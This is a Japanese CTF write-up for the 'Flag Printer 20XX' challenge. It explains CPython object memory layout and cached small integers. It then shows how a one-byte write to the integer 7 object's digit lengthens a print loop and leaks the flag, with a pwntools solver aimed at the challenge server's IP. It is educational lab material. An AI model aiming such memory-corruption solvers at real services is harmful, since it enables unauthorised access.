# Flag Printer 20XX

## / Overview

PyObjectの値書き換え

`id(0)`によって0という整数オブジェクトのアドレスが与えられた後、任意のアドレスに1バイトだけ書き込みを行えます。

その後のフラグ表示処理ではfor文によって`len("Alpaca{")`の位置までフラグを表示します。

## / Preliminary

Pythonの値は全てオブジェクトであり、基本的にヒープ上に存在します。全てのデータ型は以下のような構造を持つ`PyObject`から派生しています。

```c
typedef struct _object {  
    Py_ssize_t ob_refcnt; // 参照カウント。プログラム内で何回参照されたか
    struct _typeobject *ob_type; // オブジェクトを識別する番号
} PyObject;
```

ここから以下のように派生してそれぞれの型に対応するオブジェクトになります。

```
PyObject (すべての基底: 参照カウント, 型ポインタ)
├── PyFloatObject (浮動小数点数: Cのdouble)
├── PyDictObject (辞書: ハッシュテーブル)
├── PySetObject (集合: ハッシュテーブル)
├── PyComplexObject (複素数: 実部と虚部)
├── PyUnicodeObject (文字列: エンコーディング情報など)
└── PyVarObject (可変長オブジェクトの基底: 要素数 ob_size を追加)
    ├── PyLongObject (整数: 多倍長整数)
    ├── PyListObject (リスト: 動的配列のポインタ)
    ├── PyTupleObject (タプル: 固定長のポインタ配列)
    ├── PyTypeObject (型/クラス: メソッドやプロパティ群)
    └── PyBytesObject (バイト列)
```

派生というのは構造体の埋め込みのことで、マクロ展開されるとPyLongObjectは次のようなオブジェクトになります。

```c
struct _longobject {
    Py_ssize_t ob_refcnt;   // PyObjectから
    struct _typeobject *ob_type;  // PyObjectから
    Py_ssize_t ob_size;           // PyVarObjectから
    digit ob_digit[1];            // 実際の整数値
};
```

整数のオブジェクトであるPyLongObjectの場合、それぞれのメンバは8バイトのデータを確保しているため、全部で32バイト確保していることになります。

もう一つ重要な概念として、Pythonは実行される時に-5から256の数値をまとめてメモリ上に展開します。つまり`id(0)`の32バイト後は`id(1)`になっています。

## / Writeup

前述の前提知識を用いると、ループで表示する文字数を増やすことができます。

`len("Alpaca{")`は7なので、7というPyLongObjectのob_digitの値を任意に書き換えます。リトルエンディアンであることを考慮すると、ob_digitは`id(7)+24`の1バイト目が`07`になっているはずなので、合計で`id(0)+32*7+24`の位置に`0B`を書き込めば、`len("Alpaca{")`の実際の長さは11だと解釈されます。

ここで注意したいのが、for文の中で`i`の値が7になる時、実際に表示される数値も`flag[11]`（つまりフラグの末尾）になるということです。インデックスとしては

```
0 1 2 3 4 5 6 11 8 9 10
```

の要素が順番に表示されます。

これでは実際の`flag[7]`の要素が分からないので、２回目の接続で例えば2のオブジェクトのob_digitを`07`などに書き換えて値を読みます。表示されるインデックスは以下の通りです。

```
0 1 7 3 4 5 6 
```

これで全ての文字が分かったので並び替えてフラグを復元します。

<details><summary>Solver</summary>

```py
from pwn import *

#=====================================
# ループ回数を7->11にして11文字目まで読む
# idx -> 0 1 2 3 4 5 6 11 8 9 10
#=====================================
p = remote('34.170.146.252', 19629)

p.recvuntil(b'Hint: id(0) = ')
idx = int(p.recvline().decode().strip())
offset = idx + 32*7 + 24

p.sendafter(b'Offset: ', str(offset).encode()+b'\n')
p.sendafter(b'1-byte (Hex): ', b'0b\n')
m1 = p.recvall().decode()
p.close()


#======================================
# 2->8にして8文字目だけをピンポイントで抜く
# idx -> 0 1 7 3 4 5 6 
#======================================
p = remote('34.170.146.252', 19629)

p.recvuntil(b'Hint: id(0) = ')
idx = int(p.recvline().decode().strip())
offset = idx + 32*2 + 24

p.sendafter(b'Offset: ', str(offset).encode()+b'\n')
p.sendafter(b'1-byte (Hex): ', b'07\n')
m2 = p.recvall().decode()
p.close()


#==================================
# 結果を組み合わせてフラグを復元
# idx -> 0 1 2 3 4 5 6 7 8 9 10 11
#==================================
tmp = m1[7]
m1 = m1[:7] + m2[2] + m1[8:]
m1 += tmp

print(f"Flag: {m1}")
```
</details>

## / Appendix

先日参加した SECCON Beginners CTF 2026 のWriteupを執筆し終えたので、良ければ見てみてください。

> SECCON Beginners CTF 2026 Writeup
> https://zenn.dev/goroshirow/articles/f83c2eaa46e9a6

加えて、PyObjectが体験できるコードを作成しましたので色々実験に使ってみてください。

```py
import ctypes
import sys

def dump_object_memory(obj):
    size = sys.getsizeof(obj)
    addr = id(obj)
    data = ctypes.string_at(addr, size)
    
    print(f"\n--- Memory dump of {type(obj).__name__} (Size: {size} bytes) ---")
    
    for i in range(0, size, 8):
        chunk = data[i:i+8]
        hex_part = chunk.hex(' ')
        
        # ASCII表示の生成: 0x20〜0x7e (表示可能なASCII文字) のみ表示、他は '.'
        ascii_part = "".join([chr(b) if 32 <= b <= 126 else "." for b in chunk])
        
        # 表示幅を揃えるための整形
        print(f"Offset {i:02d}-{i+len(chunk)-1:02d}: {hex_part:<23} | {ascii_part}")

# 試してみる
dump_object_memory(0)
dump_object_memory(1)
dump_object_memory(2)
dump_object_memory(2**32-1)
dump_object_memory(0xdeadbeef)

t = "hello worle"
dump_object_memory("hello world")
dump_object_memory("hello worle")

dump_object_memory([1, 2, 3])
dump_object_memory((1, 2, 3))
dump_object_memory({1, 2, 3})
dump_object_memory({"key": "value"})
dump_object_memory(None)
dump_object_memory(3.14)
dump_object_memory(1+2j)
dump_object_memory(b"bytes")
dump_object_memory(bytearray(b"bytearray"))

dump_object_memory(True)
dump_object_memory(False)
```